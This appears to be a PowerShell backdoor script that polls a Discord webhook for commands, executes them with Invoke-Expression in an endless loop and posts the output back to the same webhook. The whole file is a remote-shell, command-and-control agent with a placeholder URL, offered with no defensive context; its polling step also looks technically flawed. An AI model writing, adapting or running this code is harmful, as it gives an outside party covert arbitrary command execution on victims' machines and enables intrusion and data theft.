$webhookUrl = "DEIN_DISCORD_WEBHOOK_URL"

function Execute-Command {
    param (
        [string]$command
    )

    $payload = @{
        content = $command
    } | ConvertTo-Json

    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
}

while ($true) {
    $command = (Invoke-RestMethod -Uri $webhookUrl).content
    if ($command -ne $null) {
        $output = Invoke-Expression -Command $command 2>&1
        Execute-Command -command $output
    }
    Start-Sleep -Seconds 5
}
